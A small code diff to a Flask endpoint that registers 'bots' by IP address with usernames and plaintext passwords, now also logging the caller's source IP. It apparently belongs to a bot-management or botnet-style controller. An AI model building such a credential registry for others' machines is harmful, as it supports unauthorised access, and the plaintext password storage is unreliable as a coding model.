@@ -134,10 +134,10 @@ def addbot():
     val = bots_table.find_one({"ip":j['ip']})
     if(val is not None):
         if(val["username"] == j['username'] and val["password"] == j['password']):
-            return jsonify({'code':200,'data':request.remote_addr})
+            return jsonify({'code':200,'data':"bot already exists"})
         bots_table.delete_one({"ip":j['ip']})
     nextId = getNextSequence(counter,"botId")  
-    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":""})
+    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":"","sourceIP":request.remote_addr})
     return jsonify({'code':200})
 
 
